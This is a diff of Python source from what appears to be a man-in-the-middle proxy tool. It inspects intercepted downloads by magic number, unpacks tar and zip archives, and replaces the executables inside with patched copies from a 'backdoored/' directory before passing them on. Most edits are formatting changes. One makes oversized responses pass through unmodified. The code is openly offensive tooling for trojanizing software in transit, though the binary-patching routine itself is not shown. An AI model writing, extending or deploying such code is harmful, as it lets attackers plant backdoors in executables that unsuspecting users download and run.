@@ -103,27 +103,13 @@ class proxyMaster(controller.Master):
         self.zipMimeTypes = (['application/x-zip-compressed'], ['application/zip'])
 
         #USED NOW
-        self.magicNumbers = {
-               'elf': {
-                'number': '7f454c46'.decode('hex'),
-                'offset': 0
-            }, 'pe': {
-                'number': 'MZ',
-                'offset': 0
-            }, 'gz': {
-                'number': '1f8b'.decode('hex'),
-                'offset': 0
-            }, 'bz': {
-                'number': 'BZ',
-                'offset': 0
-            }, 'zip': {
-                'number': '504b0304'.decode('hex'),
-                'offset': 0
-            }, 'tar': {
-                'number': 'ustar',
-                'offset': 257
-            }
-        }
+        self.magicNumbers = {'elf': {'number': '7f454c46'.decode('hex'), 'offset': 0},
+                             'pe': {'number': 'MZ', 'offset': 0},
+                             'gz': {'number': '1f8b'.decode('hex'), 'offset': 0},
+                             'bz': {'number': 'BZ', 'offset': 0},
+                             'zip': {'number': '504b0304'.decode('hex'), 'offset': 0},
+                             'tar': {'number': 'ustar', 'offset': 257}
+                             }
 
     def run(self):
         try:
@@ -166,7 +152,7 @@ class proxyMaster(controller.Master):
             tarFile = None
             try:
                 tarFileStorage.seek(0)
-                tarFile = tarfile.open(fileobj=tarFileStorage, mode='r'+compressionMode)
+                tarFile = tarfile.open(fileobj=tarFileStorage, mode='r' + compressionMode)
             except tarfile.ReadError:
                 pass
 
@@ -182,7 +168,7 @@ class proxyMaster(controller.Master):
                 print "\t", info.name, info.mtime, info.size
 
             newTarFileStorage = tempfile.NamedTemporaryFile()
-            newTarFile = tarfile.open(mode='w'+compressionMode, fileobj=newTarFileStorage)
+            newTarFile = tarfile.open(mode='w' + compressionMode, fileobj=newTarFileStorage)
 
             patchCount = 0
             for info in members:
@@ -229,7 +215,7 @@ class proxyMaster(controller.Master):
                         patchResult = self.binaryGrinder(tmp.name)
                         if patchResult:
                             patchCount += 1
-                            file2 = "backdoored/"+ os.path.basename(tmp.name)
+                            file2 = "backdoored/" + os.path.basename(tmp.name)
                             print "[*] Patching complete, adding to tar file."
                             info.size = os.stat(file2).st_size
                             with open(file2, 'rb') as f:
@@ -248,7 +234,7 @@ class proxyMaster(controller.Master):
             # then read the new tar file into memory
             newTarFileStorage.seek(0)
             ret = newTarFileStorage.read()
-            newTarFileStorage.close() # it's automatically deleted
+            newTarFileStorage.close()  # it's automatically deleted
             return ret
 
     def zip_files(self, aZipFile):
@@ -640,13 +626,10 @@ class proxyMaster(controller.Master):
                     self.parse_target_config(self.userConfig['targets'][target])
 
             if 'content-length' in msg.headers.keys():
-                if int(msg.headers['content-length'][0]) >= self.FileSizeMax:
+                if int(msg.headers['content-length'][0]) >= long(self.FileSizeMax):
                     print "[!] Not patching over content-length, forwarding to user"
                     logging.info("Over FileSizeMax setting %s : %s", msg.request.host, msg.request.path)
-                    self.patchIT = False
-
-            # if it's a tar file, it injects executables inside,
-            # otherwise just returns the same bytes it was given
+                    msg.reply()
 
             if self.bytes_have_format(msg.content, 'zip') and self.convert_to_Bool(self.CompressedFiles) is True:
                     aZipFile = msg.content
@@ -676,6 +659,7 @@ class proxyMaster(controller.Master):
                 os.close(fd)
 
                 os.remove(tmpFile)
+
             elif self.bytes_have_format(msg.content, 'gz') and self.convert_to_Bool(self.CompressedFiles) is True:
                 # assume .tar.gz for now
                 msg.content = self.tar_files(msg.content, 'gz')
